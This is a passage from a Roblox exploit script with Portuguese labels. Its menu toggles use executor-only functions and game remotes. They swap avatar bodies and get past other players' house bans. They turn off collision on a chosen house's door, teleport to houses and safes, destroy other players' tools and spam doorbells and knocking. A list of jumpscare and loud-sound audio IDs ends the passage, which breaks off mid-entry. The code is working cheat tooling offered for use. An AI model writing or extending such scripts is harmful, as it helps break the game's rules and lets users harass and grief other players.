= {\n                            [1] = savedNukeBody.Torso,\n                            [2] = savedNukeBody.RightArm,\n                            [3] = savedNukeBody.LeftArm,\n                            [4] = savedNukeBody.RightLeg,\n                            [5] = savedNukeBody.LeftLeg,\n                            [6] = savedNukeBody.Head\n                        }\n                        \n                        local args = {\n                            [1] = restoreBody\n                        }\n                        \n                        pcall(function()\n                            game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))\n                        end)\n                        \n                        savedNukeBody = {}\n                    end\n                end\n            end\n        end\n    end\n})\n\nlocal nukeFlashEnabled = false\nlocal nukeFlashTrack = nil\nlocal flashRigidTrack = nil\nlocal savedNukeFlashBody = {}\n\nlocal function stopFlashAnimations()\n    if flashRigidTrack then\n        pcall(function()\n            flashRigidTrack:Stop()\n            flashRigidTrack:Destroy()\n        end)\n        flashRigidTrack = nil\n    end\n    \n    if nukeFlashTrack then\n        pcall(function()\n            nukeFlashTrack:Stop()\n            nukeFlashTrack:Destroy()\n        end)\n        nukeFlashTrack = nil\n    end\nend\n\nTroll:AddToggle({\n    Name = "IMAGEM NO CEU 2.0",\n    Default = false,\n    Callback = function(value)\n        nukeFlashEnabled = value\n        \n        if value then\n            local player = game.Players.LocalPlayer\n            local character = player.Character\n            \n            if character then\n                local humanoid = character:FindFirstChildOfClass("Humanoid")\n                if humanoid then\n                    local description = humanoid:GetAppliedDescription()\n                    \n                    savedNukeFlashBody = {\n                        Torso = description.Torso,\n                        RightArm = description.RightArm,\n                        LeftArm = description.LeftArm,\n                        RightLeg = description.RightLeg,\n                        LeftLeg = description.LeftLeg,\n                        Head = description.Head\n                    }\n                    \n                    task.wait(0.2)\n                    \n                    local args = {\n                        [1] = 123402086843885,\n                        [2] = 100839513065432,\n                        [3] = 78300682916056,\n                        [4] = 86276701020724,\n                        [5] = 78409653958165,\n                        [6] = 15093053680\n                    }\n                    \n                    pcall(function()\n                        game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(args)\n                    end)\n                    \n                    task.wait(0.3)\n                    \n                    local newAnim = Instance.new("Animation")\n                    newAnim.AnimationId = "rbxassetid://70883871260184"\n                    \n                    nukeFlashTrack = humanoid:LoadAnimation(newAnim)\n                    nukeFlashTrack.Priority = Enum.AnimationPriority.Action4\n                    nukeFlashTrack:Play(0.1, 1, 1)\n                    \n                    task.wait(0.1)\n                    nukeFlashTrack:AdjustSpeed(5)\n                    \n                    task.wait(0.3)\n                    \n                    local plankAnim = Instance.new("Animation")\n                    plankAnim.AnimationId = "rbxassetid://3695333486"\n                    flashRigidTrack = humanoid:LoadAnimation(plankAnim)\n                    flashRigidTrack.Priority = Enum.AnimationPriority.Movement\n                    flashRigidTrack:Play(0.1, 1, 0)\n                end\n            end\n        else\n            stopFlashAnimations()\n            \n            task.wait(0.2)\n            \n            if next(savedNukeFlashBody) then\n                local player = game.Players.LocalPlayer\n                local character = player.Character\n                \n                if character then\n                    local humanoid = character:FindFirstChildOfClass("Humanoid")\n                    if humanoid then\n                        local restoreBody = {\n                            [1] = savedNukeFlashBody.Torso,\n                            [2] = savedNukeFlashBody.RightArm,\n                            [3] = savedNukeFlashBody.LeftArm,\n                            [4] = savedNukeFlashBody.RightLeg,\n                            [5] = savedNukeFlashBody.LeftLeg,\n                            [6] = savedNukeFlashBody.Head\n                        }\n                        \n                        local args = {\n                            [1] = restoreBody\n                        }\n                        \n                        pcall(function()\n                            game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))\n                        end)\n                        \n                        savedNukeFlashBody = {}\n                    end\n                end\n            end\n        end\n    end\n})\n\n\nlocal LocalPlayer = game:GetService("Players").LocalPlayer\nlocal Workspace = game:GetService("Workspace")\nlocal RunService = game:GetService("RunService")\n\nlocal backupTables = {\n    Vehicles = {},\n    Canoes = {},\n    Jets = {},\n    Helis = {},\n    Balls = {}\n}\n\nlocal TeleportCarro = {}\nfunction TeleportCarro:MostrarNotificacao(msg)\n    print("\240x\29\29 "..msg)\nend\n\nlocal function AntiFlingLoop(name, getFolderFunc)\n    local active = false\n    task.spawn(function()\n        while true do\n            if active and LocalPlayer.Character then\n                local folder = getFolderFunc()\n                if folder then\n                    for _, item in ipairs(folder:GetChildren()) do\n                        local isMine = false\n                        if name == "Vehicles" then\n                            for _, seat in ipairs(item:GetDescendants()) do\n                                if (seat:IsA("VehicleSeat") or seat:IsA("Seat")) and seat.Occupant and seat.Occupant.Parent == LocalPlayer.Character then\n                                    isMine = true\n                                    break\n                                end\n                            end\n                        elseif name == "Canoes" then\n                            local owner = item:FindFirstChild("Owner")\n                            isMine = owner and owner.Value == LocalPlayer\n                        elseif name == "Jets" or name == "Helis" then\n                            isMine = item.Name == LocalPlayer.Name\n                        end\n                        if not isMine then\n                            table.insert(backupTables[name], item:Clone())\n                            item:Destroy()\n                        end\n                    end\n                end\n            end\n            task.wait(0.03)\n        end\n    end)\n    return function(state)\n        active = state\n        TeleportCarro:MostrarNotificacao(name.." "..(state and "ativado!" or "desativado!"))\n        if not state then\n            for _, item in ipairs(backupTables[name]) do\n                local parentFolder = getFolderFunc()\n                if parentFolder then item.Parent = parentFolder end\n            end\n            backupTables[name] = {}\n        end\n    end\nend\n \nprotec:AddSection({\n    Name = "MENU ANTI"\n})\n\nprotec:AddButton({\n    Name = "PROTE\199\195O BUG {IRREVERS\205VEL}",\n    Description = "CRIA UMA PROTE\199\195O CONTRA BUGS/SCRIPT",\n    Callback = function()\n        local Players = game:GetService("Players")\n        local LocalPlayer = Players.LocalPlayer\n\n        local blacklist = {\n            {Name = "water", Class = "Part"},\n        }\n\n        local function neutralize(part)\n            if part and part:IsA("BasePart") then\n                pcall(function()\n                    part.Anchored = true\n                    part.CanCollide = false\n                    part.Massless = true\n                    part.Transparency = 1\n                    part:ClearAllChildren()\n                end)\n                pcall(function()\n                    part:Destroy()\n                end)\n            end\n        end\n\n        workspace.DescendantAdded:Connect(function(obj)\n            for _, rule in ipairs(blacklist) do\n                if obj.Name == rule.Name and obj.ClassName == rule.Class then\n                    neutralize(obj)\n                end\n            end\n        end)\n\n        for _, obj in ipairs(workspace:GetDescendants()) do\n            for _, rule in ipairs(blacklist) do\n                if obj.Name == rule.Name and obj.ClassName == rule.Class then\n                    neutralize(obj)\n                end\n            end\n        end\n\n        task.spawn(function()\n            while task.wait(0.25) do\n                for _, rule in ipairs(blacklist) do\n                    for _, v in next, getnilinstances() do\n                        if v.Name == rule.Name and v.ClassName == rule.Class then\n                            neutralize(v)\n                        end\n                    end\n                end\n            end\n        end)\n\n        LocalPlayer.CharacterAdded:Connect(function(char)\n            local hum = char:WaitForChild("Humanoid")\n            hum.Touched:Connect(function(hit)\n                for _, rule in ipairs(blacklist) do\n                    if hit.Name == rule.Name and hit.ClassName == rule.Class then\n                        neutralize(hit)\n                    end\n                end\n            end)\n        end)\n    end\n})\n\nprotec:AddButton({\n\tName = "ANTI ST FULL",\n\tCallback = function()\n\t\tlocal player = game.Players.LocalPlayer\n\n\t\tif player.Character and player.Character:FindFirstChild("Humanoid") then\n\t\t\t-- Renomeia o Humanoid original\n\t\t\tplayer.Character.Humanoid.Name = "1"\n\n\t\t\t-- Clona e renomeia o novo como "Humanoid"\n\t\t\tlocal clone = player.Character["1"]:Clone()\n\t\t\tclone.Parent = player.Character\n\t\t\tclone.Name = "Humanoid"\n\t\t\ttask.wait(0.1)\n\n\t\t\t-- Remove o antigo\n\t\t\tplayer.Character["1"]:Destroy()\n\n\t\t\t-- Atualiza a c\226mera\n\t\t\tworkspace.CurrentCamera.CameraSubject = player.Character.Humanoid\n\n\t\t\t-- Reinicia o Animate (se existir)\n\t\t\tlocal anim = player.Character:FindFirstChild("Animate")\n\t\t\tif anim then\n\t\t\t\tanim.Disabled = true\n\t\t\t\ttask.wait(0.1)\n\t\t\t\tanim.Disabled = false\n\t\t\tend\n\t\tend\n\tend\n})\n\n\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\n\n-- =\1 Fun\231\227o: Remove tools de OUTROS jogadores (mochila e personagem)\nlocal function removerToolsDe(player)\n\tpcall(function()\n\t\tif player:FindFirstChild("Backpack") then\n\t\t\tfor _, tool in ipairs(player.Backpack:GetChildren()) do\n\t\t\t\tif tool:IsA("Tool") then\n\t\t\t\t\ttool:Destroy()\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\t\tif player.Character then\n\t\t\tfor _, obj in ipairs(player.Character:GetChildren()) do\n\t\t\t\tif obj:IsA("Tool") then\n\t\t\t\t\tobj:Destroy()\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\tend)\nend\n\n-- =\1 Fun\231\227o: Remove suas pr\243prias Tools localmente (sem afetar os outros)\nlocal function removerMinhasTools()\n\tpcall(function()\n\t\tif LocalPlayer:FindFirstChild("Backpack") then\n\t\t\tfor _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do\n\t\t\t\tif tool:IsA("Tool") then\n\t\t\t\t\ttool:Destroy()\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\t\tif LocalPlayer.Character then\n\t\t\tfor _, tool in ipairs(LocalPlayer.Character:GetChildren()) do\n\t\t\t\tif tool:IsA("Tool") then\n\t\t\t\t\ttool:Destroy()\n\t\t\t\tend\n\t\t\tend\n\t\tend\n\tend)\nend\n\n\nlocal rodando = false\n\nprotec:AddToggle({\n\tName = "ANTI TOOL FULL",\n\tDefault = false,\n\tCallback = function(Value)\n\t\trodando = Value\n\n\t\tif rodando then\n\t\t\tprint("=\18 ANTI TOOL PRO ATIVADO")\n\n\t\t\ttask.spawn(function()\n\t\t\t\twhile rodando do\n\t\t\t\t\ttask.wait(1)\n\n\t\t\t\t\t-- Remover tools de todos os outros\n\t\t\t\t\tfor _, player in ipairs(Players:GetPlayers()) do\n\t\t\t\t\t\tif player ~= LocalPlayer then\n\t\t\t\t\t\t\tremoverToolsDe(player)\n\t\t\t\t\t\tend\n\t\t\t\t\tend\n\n\t\t\t\t\t-- Remover suas pr\243prias tools localmente\n\t\t\t\t\tremoverMinhasTools()\n\t\t\t\tend\n\t\t\tend)\n\n\t\telse\n\t\t\tprint("=\19 ANTI TOOL PRO DESATIVADO")\n\t\tend\n\tend\n})\nprotec:AddToggle({\n    Name = "ANTI FLING CARROS",\n    Description = "",\n    Default = false,\n    Callback = AntiFlingLoop("Vehicles", function()\n        return Workspace:FindFirstChild("Vehicles")\n    end)\n})\n\nprotec:AddToggle({\n    Name = "ANTI CANOE FLING",\n    Description = "",\n    Default = false,\n    Callback = AntiFlingLoop("Canoes", function()\n        local workspaceCom = Workspace:FindFirstChild("WorkspaceCom")\n        return workspaceCom and workspaceCom:FindFirstChild("001_CanoeStorage")\n    end)\n})\n\nprotec:AddToggle({\n    Name = "ANTI FLING JETS",\n    Description = "",\n    Default = false,\n    Callback = AntiFlingLoop("Jets", function()\n        local folder = Workspace:FindFirstChild("WorkspaceCom")\n        if folder and folder:FindFirstChild("001_Airport") then\n            local storage = folder["001_Airport"]:FindFirstChild("AirportHanger")\n            if storage then return storage:FindFirstChild("001_JetStorage") and storage["001_JetStorage"]:FindFirstChild("JetAirport") end\n        end\n    end)\n})\n\nprotec:AddToggle({\n    Name = "ANTI FLING HELIC\211PTEROS",\n    Description = "",\n    Default = false,\n    Callback = AntiFlingLoop("Helis", function()\n        local folder = Workspace:FindFirstChild("WorkspaceCom")\n        return folder and folder:FindFirstChild("001_HeliStorage") and folder["001_HeliStorage"]:FindFirstChild("PoliceStationHeli")\n    end)\n})\n\nprotec:AddToggle({\n    Name = "ANTI FLING BOLA",\n    Description = "",\n    Default = false,\n    Callback = AntiFlingLoop("Balls", function()\n        local folder = Workspace:FindFirstChild("WorkspaceCom")\n        return folder and folder:FindFirstChild("001_SoccerBalls")\n    end)\n})\n\n\nlocal antiSitActive = false\nprotec:AddToggle({\n    Name = "ANTI SENTA",\n    Description = "",\n    Default = false,\n    Callback = function(state)\n        antiSitActive = state\n        TeleportCarro:MostrarNotificacao("Anti Sit "..(state and "ativado!" or "desativado!"))\n        task.spawn(function()\n            while antiSitActive and LocalPlayer.Character do\n                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")\n                if humanoid then\n                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n                    if humanoid:GetState() == Enum.HumanoidStateType.Seated then\n                        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)\n                    end\n                end\n                task.wait(0.05)\n            end\n            if not antiSitActive then\n                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")\n                if humanoid then\n                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n                end\n            end\n        end)\n    end\n})\n\nprotec:AddToggle({\n    Name = "ANTI-LAG",\n    Description = "",\n    Default = false,\n    Callback = function(state)\n        local Players = game:GetService("Players")\n        local dedupLock = {}\n        local IGNORED_PLAYER\n\n        if not state then return end\n\n        local function marcarIgnorado(player)\n            IGNORED_PLAYER = player\n        end\n\n        local function isTargetTool(inst)\n            return inst:IsA("Tool")\n        end\n\n        local function gatherTools(player)\n            local found = {}\n            local containers = {}\n            if player.Character then table.insert(containers, player.Character) end\n            local backpack = player:FindFirstChildOfClass("Backpack")\n            if backpack then table.insert(containers, backpack) end\n            local sg = player:FindFirstChild("StarterGear")\n            if sg then table.insert(containers, sg) end\n            for _, container in ipairs(containers) do\n                for _, child in ipairs(container:GetChildren()) do\n                    if isTargetTool(child) then table.insert(found, child) end\n                end\n            end\n            return found\n        end\n\n        local function dedupePlayer(player)\n            if player == IGNORED_PLAYER then return end\n            if dedupLock[player] then return end\n            dedupLock[player] = true\n            local tools = gatherTools(player)\n            if #tools > 1 then\n                for i = 2, #tools do pcall(function() tools[i]:Destroy() end) end\n            end\n            dedupLock[player] = false\n        end\n\n        local function hookPlayer(player)\n            if not IGNORED_PLAYER then marcarIgnorado(player) end\n            task.defer(dedupePlayer, player)\n            local function setupChar(char)\n                task.delay(0.5, function() dedupePlayer(player) end)\n                char.ChildAdded:Connect(function(child)\n                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end\n                end)\n            end\n            if player.Character then setupChar(player.Character) end\n            player.CharacterAdded:Connect(setupChar)\n            local backpack = player:WaitForChild("Backpack", 10)\n            if backpack then\n                backpack.ChildAdded:Connect(function(child)\n                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end\n                end)\n            end\n            local sg = player:FindFirstChild("StarterGear") or player:WaitForChild("StarterGear", 10)\n            if sg then\n                sg.ChildAdded:Connect(function(child)\n                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end\n                end)\n            end\n        end\n\n        Players.PlayerAdded:Connect(hookPlayer)\n        for _, plr in ipairs(Players:GetPlayers()) do hookPlayer(plr) end\n\n        task.spawn(function()\n            while state do\n                for _, plr in ipairs(Players:GetPlayers()) do dedupePlayer(plr) end\n                task.wait(2)\n            end\n        end)\n    end\n})\n\nprotec:AddToggle({\n    Name = "ANTI FLING PORTAS",\n    Description = "",\n    Default = false,\n    Callback = function(state)\n        if not _G.hiddenDoors then _G.hiddenDoors = {} end\n        if state then\n            _G.hiddenDoors = {}\n            for _, obj in ipairs(workspace:GetDescendants()) do\n                if obj:IsA("BasePart") and obj.Name:lower():find("door") then\n                    local doorData = {\n                        door = obj,\n                        originalTransparency = obj.Transparency,\n                        originalCanCollide = obj.CanCollide,\n                        originalCastShadow = obj.CastShadow\n                    }\n                    obj.Transparency = 1\n                    obj.CanCollide = false\n                    obj.CastShadow = false\n                    for _, child in ipairs(obj:GetChildren()) do\n                        if child:IsA("BasePart") then\n                            child.Transparency = 1\n                            child.CanCollide = false\n                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then\n                            child.Enabled = false\n                        end\n                    end\n                    table.insert(_G.hiddenDoors, doorData)\n                end\n            end\n            print("\240x\29\167 " .. #_G.hiddenDoors .. " portas escondidas!")\n        else\n            for _, doorData in ipairs(_G.hiddenDoors or {}) do\n                if doorData.door and doorData.door.Parent then\n                    doorData.door.Transparency = doorData.originalTransparency\n                    doorData.door.CanCollide = doorData.originalCanCollide\n                    doorData.door.CastShadow = doorData.originalCastShadow\n                    for _, child in ipairs(doorData.door:GetChildren()) do\n                        if child:IsA("BasePart") then\n                            child.Transparency = 0\n                            child.CanCollide = true\n                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then\n                            child.Enabled = true\n                        end\n                    end\n                end\n            end\n            print("\226S& " .. #(_G.hiddenDoors or {}) .. " portas restauradas com funcionalidade!")\n            _G.hiddenDoors = {}\n        end\n    end\n})\n\n\nlocal isHouseRGBActive = false\n\nlocal colors = {\n    Color3.new(1, 0, 0),       -- Vermelho\n    Color3.new(0, 1, 0),       -- Verde\n    Color3.new(0, 0, 1),       -- Azul\n    Color3.new(1, 1, 0),       -- Amarelo\n    Color3.new(0, 1, 1),       -- Ciano\n    Color3.new(1, 0, 1)        -- Magenta\n}\n\nlocal function changeColor()\n    local replicatedStorage = game:GetService("ReplicatedStorage")\n    local remoteEvent = replicatedStorage:FindFirstChild("RE") and replicatedStorage.RE:FindFirstChild("1Player1sHous1e")\n\n    if not remoteEvent then\n        warn("RemoteEvent \'1Player1sHous1e\' n\227o encontrado.")\n        return\n    end\n\n    while isHouseRGBActive do\n        for _, color in ipairs(colors) do\n            if not isHouseRGBActive then return end\n            local args = {\n                [1] = "ColorPickHouse",\n                [2] = color\n            }\n            pcall(function()\n                remoteEvent:FireServer(unpack(args))\n            end)\n            task.wait(0.8)\n        end\n    end\nend\n\nlocal function toggleHouseRGB(state)\n    isHouseRGBActive = state\n    if isHouseRGBActive then\n        print("Casa RGB Ativada")\n        spawn(changeColor)\n    else\n        print("Casa RGB Desativada")\n    end\nend\n\n-- Agora sim, corretamente:\nTabcasa:AddToggle({\n    Name = "CASA RGB",\n    Default = false,\n    Callback = function(state)\n        toggleHouseRGB(state)\n    end\n})\n\nTabcasa:AddButton({\n    Name = "UNBAN",\n    Callback = function()\n        local Players = game:GetService("Players")\n        local player = Players.LocalPlayer\n        local houseModel = nil\n\n        -- 1. Remove a barreira vermelha (bloqueio local)\n        for _, obj in pairs(workspace:GetDescendants()) do\n            if obj:IsA("Part") and obj.Transparency > 0.5 and obj.Size.X > 20 and obj.Size.Y > 20 and obj.Size.Z > 20 then\n                if tostring(obj.BrickColor):lower():find("red") or tostring(obj.Color):lower():find("255") then\n                    obj.CanCollide = false\n                    obj.Transparency = 1\n                    obj.Material = Enum.Material.SmoothPlastic\n                end\n            end\n        end\n\n        -- 2. Procura a casa e tenta aplicar unban\n        local lots = workspace:FindFirstChild("001_Lots")\n        if lots then\n            for _, v in pairs(lots:GetDescendants()) do\n                if v.Name == "Permissions" and v:IsA("Folder") then\n                    if v:FindFirstChild("Allow") then\n                        houseModel = v\n                        break\n                    end\n                end\n            end\n        end\n\n        -- 3. Envia unban\n        if houseModel then\n            local allowRemote = houseModel:FindFirstChild("Allow")\n            if allowRemote and allowRemote:IsA("RemoteEvent") then\n                allowRemote:FireServer(player)\n                print("Unban enviado com sucesso!")\n            else\n                warn("Remote \'Allow\' n\227o encontrado.")\n            end\n        else\n            warn("Nenhuma casa com sistema \'Permissions\' encontrada.")\n        end\n    end\n})\n\n\nTabcasa:AddSection({ Name = "TROLL CASA" })\n\nlocal isUnbanActive = false\nlocal SelectHouse = nil\nlocal NoclipDoor = nil\n\n-- Fun\231\227o para obter lista de casas\nlocal function getHouseList()\n    local Tabela = {}\n    local lots = workspace:FindFirstChild("001_Lots")\n    if lots then\n        for _, House in ipairs(lots:GetChildren()) do\n            if House.Name ~= "For Sale" and House:IsA("Model") then\n                table.insert(Tabela, House.Name)\n            end\n        end\n    end\n    return Tabela\nend\n\n-- Dropdown para selecionar casas\npcall(function()\n    Tabcasa:AddDropdown({\n        Name = "SELECIONE A CASA",\n        Options = getHouseList(),\n        Default = "...",\n        Callback = function(Value)\n            SelectHouse = Value\n            if NoclipDoor then\n                NoclipDoor:Set(false)\n            end\n            print("Casa selecionada: " .. tostring(Value))\n        end\n    })\nend)\n\n-- Fun\231\227o para atualizar a lista de casas\nlocal function DropdownHouseUpdate()\n    local Tabela = getHouseList()\n    print("DropdownHouseUpdate called. Houses found:", #Tabela)\n    pcall(function()\n        Tabcasa:ClearDropdown("Selecione a Casa") -- Tentar limpar dropdown, se suportado\n        Tabcasa:AddDropdown({\n            Name = "SELECIONE A CASA",\n            Options = Tabela,\n            Default = "...",\n            Callback = function(Value)\n                SelectHouse = Value\n                if NoclipDoor then\n                    NoclipDoor:Set(false)\n                end\n            end\n        })\n    end)\nend\n\n-- Inicializar dropdown\npcall(DropdownHouseUpdate)\n\n-- Bot\227o para atualizar lista de casas\npcall(function()\n    Tabcasa:AddButton({\n        Name = "ATUALIZAR LISTA DE CASAS",\n        Callback = function()\n            print("Atualizar Lista de Casas button clicked.")\n            pcall(DropdownHouseUpdate)\n        end\n    })\nend)\n\n-- Bot\227o para teleportar para casa\npcall(function()\n    Tabcasa:AddButton({\n        Name = "TELEPORTAR PARA CASA",\n        Callback = function()\n            local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))\n            if House and game.Players.LocalPlayer.Character then\n                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(House.WorldPivot.Position)\n            else\n                print("Casa n\227o encontrada: " .. tostring(SelectHouse))\n            end\n        end\n    })\nend)\n\n-- Bot\227o para teleportar para cofre\npcall(function()\n    Tabcasa:AddButton({\n        Name = "Teleportar para Cofre",\n        Callback = function()\n            local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))\n            if House and House:FindFirstChild("HousePickedByPlayer") and game.Players.LocalPlayer.Character then\n                local safe = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_Safe")\n                if safe then\n                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(safe.WorldPivot.Position)\n                else\n                    print("Cofre n\227o encontrado na casa: " .. tostring(SelectHouse))\n                end\n            else\n                print("Casa n\227o encontrada: " .. tostring(SelectHouse))\n            end\n        end\n    })\nend)\n\n-- Toggle para atravessar porta\npcall(function()\n    NoclipDoor = Tabcasa:AddToggle({\n        Name = "ATRAVESSAR PORTA DAS CASA",\n        Description = "",\n        Default = false,\n        Callback = function(Value)\n            pcall(function()\n                local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))\n                if House and House:FindFirstChild("HousePickedByPlayer") then\n                    local housepickedbyplayer = House.HousePickedByPlayer\n                    local doors = housepickedbyplayer.HouseModel:FindFirstChild("001_HouseDoors")\n                    if doors and doors:FindFirstChild("HouseDoorFront") then\n                        for _, Base in ipairs(doors.HouseDoorFront:GetChildren()) do\n                            if Base:IsA("BasePart") then\n                                Base.CanCollide = not Value\n                            end\n                        end\n                    end\n                end\n            end)\n        end\n    })\nend)\n\n-- Toggle para tocar campainha\npcall(function()\n    Tabcasa:AddToggle({\n        Name = "TOCAR CAMPAINHA",\n        Description = "",\n        Default = false,\n        Callback = function(Value)\n            getgenv().ChaosHubAutoSpawnDoorbellValue = Value\n            spawn(function()\n                while getgenv().ChaosHubAutoSpawnDoorbellValue do\n                    local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))\n                    if House and House:FindFirstChild("HousePickedByPlayer") then\n                        local doorbell = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_DoorBell")\n                        if doorbell and doorbell:FindFirstChild("TouchBell") then\n                            pcall(function()\n                                fireclickdetector(doorbell.TouchBell.ClickDetector)\n                            end)\n                        end\n                    end\n                    task.wait(0.5)\n                end\n            end)\n        end\n    })\nend)\n\n-- Toggle para bater na porta\npcall(function()\n    Tabcasa:AddToggle({\n        Name = "BATER NA PORTA",\n        Description = "",\n        Default = false,\n        Callback = function(Value)\n            getgenv().ChaosHubAutoSpawnDoorValue = Value\n            spawn(function()\n                while getgenv().ChaosHubAutoSpawnDoorValue do\n                    local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))\n                    if House and House:FindFirstChild("HousePickedByPlayer") then\n                        local doors = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_HouseDoors")\n                        if doors and doors:FindFirstChild("HouseDoorFront") and doors.HouseDoorFront:FindFirstChild("Knock") then\n                            pcall(function()\n                                fireclickdetector(doors.HouseDoorFront.Knock.TouchBell.ClickDetector)\n                            end)\n                        end\n                    end\n                    task.wait(0.5)\n                end\n            end)\n        end\n    })\nend)\npcall(function()\n    Tabcasa:AddSection({ Name = "TELEPORTE PARA CASAS" })\nend)\n\n-- Lista de casas para teletransporte\nlocal casas = {\n    ["Casa 1"] = Vector3.new(260.29, 4.37, 209.32),\n    ["Casa 2"] = Vector3.new(234.49, 4.37, 228.00),\n    ["Casa 3"] = Vector3.new(262.79, 21.37, 210.84),\n    ["Casa 4"] = Vector3.new(229.60, 21.37, 225.40),\n    ["Casa 5"] = Vector3.new(173.44, 21.37, 228.11),\n    ["Casa 6"] = Vector3.new(-43, 21, -137),\n    ["Casa 7"] = Vector3.new(-40, 36, -137),\n    ["Casa 11"] = Vector3.new(-21, 40, 436),\n    ["Casa 12"] = Vector3.new(155, 37, 433),\n    ["Casa 13"] = Vector3.new(255, 35, 431),\n    ["Casa 14"] = Vector3.new(254, 38, 394),\n    ["Casa 15"] = Vector3.new(148, 39, 387),\n    ["Casa 16"] = Vector3.new(-17, 42, 395),\n    ["Casa 17"] = Vector3.new(-189, 37, -247),\n    ["Casa 18"] = Vector3.new(-354, 37, -244),\n    ["Casa 19"] = Vector3.new(-456, 36, -245),\n    ["Casa 20"] = Vector3.new(-453, 38, -295),\n    ["Casa 21"] = Vector3.new(-356, 38, -294),\n    ["Casa 22"] = Vector3.new(-187, 37, -295),\n    ["Casa 23"] = Vector3.new(-410, 68, -447),\n    ["Casa 24"] = Vector3.new(-348, 69, -496),\n    ["Casa 28"] = Vector3.new(-103, 12, 1087),\n    ["Casa 29"] = Vector3.new(-730, 6, 808),\n    ["Casa 30"] = Vector3.new(-245, 7, 822),\n    ["Casa 31"] = Vector3.new(639, 76, -361),\n    ["Casa 32"] = Vector3.new(-908, 6, -361),\n    ["Casa 33"] = Vector3.new(-111, 70, -417),\n    ["Casa 34"] = Vector3.new(230, 38, 569),\n    ["Casa 35"] = Vector3.new(-30, 13, 2209)\n}\n\n-- Criar lista de nomes de casas ordenada\nlocal casasNomes = {}\nfor nome, _ in pairs(casas) do\n    table.insert(casasNomes, nome)\nend\n\ntable.sort(casasNomes, function(a, b)\n    local numA = tonumber(a:match("%d+")) or 0\n    local numB = tonumber(b:match("%d+")) or 0\n    return numA < numB\nend)\n\n-- Dropdown para teletransporte\npcall(function()\n    Tabcasa:AddDropdown({\n        Name = "Selecionar Casa",\n        Options = casasNomes,\n        Callback = function(casaSelecionada)\n            local player = game.Players.LocalPlayer\n            if player and player.Character then\n                player.Character.HumanoidRootPart.CFrame = CFrame.new(casas[casaSelecionada])\n            end\n        end\n    })\nend)\n\n\n\n\n\nlocal teleportButtons = {\n    {"TP BASTIDORES", CFrame.new(192, 4, 272)},\n    {"TP CENTRO URBANO", CFrame.new(136, 4, 117)},\n    {"TP \193REA DO CRIME", CFrame.new(-119, -28, 235)},\n    {"TP CASA DESERTA", CFrame.new(986, 4, 63)},\n    {"TP PORTAL DA AG\202NCIA", CFrame.new(672, 4, -296)},\n    {"TP ESCONDERIJO", CFrame.new(505, -75, 143)},\n    {"TP ESCOLA", CFrame.new(-312, 4, 211)},\n    {"TP CAF\201 BROOK", CFrame.new(161, 8, 52)},\n    {"TO PONTO INICIAL", CFrame.new(-26, 4, -23)},\n    {"TP ARCO PRINCIPAL", CFrame.new(-589, 141, -59)},\n    {"TP HOSPITAL", CFrame.new(-309, 4, 71)},\n    {"TP BASE DA AG\202NCIA", CFrame.new(179, 4, -464)},\n    {"TP SALA OCULTA DA OFICINA", CFrame.new(0, 4, -495)},\n    {"TP SALA SECRETA 2", CFrame.new(-343, 4, -613)},\n    {"TP ILHA ISOLADA", CFrame.new(-1925, 23, 127)},\n    {"TP PRA\199A DOS HOT\201IS", CFrame.new(182, 4, 150)},\n    {"TP ESCALAR MONTANHA 1", CFrame.new(-670, 251, 765)},\n    {"TP BANCO PRINCIPAL", CFrame.new(2.28, 4.65, 254.58)},\n    {"TP LOJA DE ROUPAS", CFrame.new(-46.15, 4.65, 253.20)},\n    {"TP REF\218GIO", CFrame.new(-88.48, 22.05, 262.34)},\n    {"TP CL\205NICA DENT\193RIA", CFrame.new(-53.58, 22.15, 265.61)},\n    {"TP CAFETERIA", CFrame.new(-97.12, 4.65, 254.99)}\n}\n\nfor _, btn in ipairs(teleportButtons) do\n    Tab:AddButton({\n        btn[1],\n        function()\n            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = btn[2]\n        end\n    })\nend\n\n\n\n\n\n-- Lista de \225udios\nlocal audios = {\n    {Name = "Yamete Kudasai", ID = 108494476595033},\n    {Name = "Gritinho", ID = 5710016194},\n    {Name = "Jumpscare Horroroso", ID = 85435253347146},\n    {Name = "\193udio Alto", ID = 6855150757},\n    {Name = "Ru\237do", ID = 120034877160791},\n    {Name = "Jumpscare 2", ID = 110637995610528},\n    {Name = "Risada Da Bruxa Minecraft", ID = 116214940486087},\n    {Name = "The Boiled One", ID = 137177653817621},\n    {Name = "Deitei Um Ave Maria Doido", ID = 128669424001766},\n    {Name = "Mandrake Detected", ID = 9068077052},\n    {Name = "Aaaaaaaaa", ID = 80156405968805},\n    {Name = "AAAHHHH", ID = 9084006093},\n    {Name = "amongus", ID = 6651571134},\n    {Name = "Sus", ID = 6701126635},\n    {Name = "Gritao AAAAAAAAA", ID = 5853668794},\n    {Name = "UHHHHH 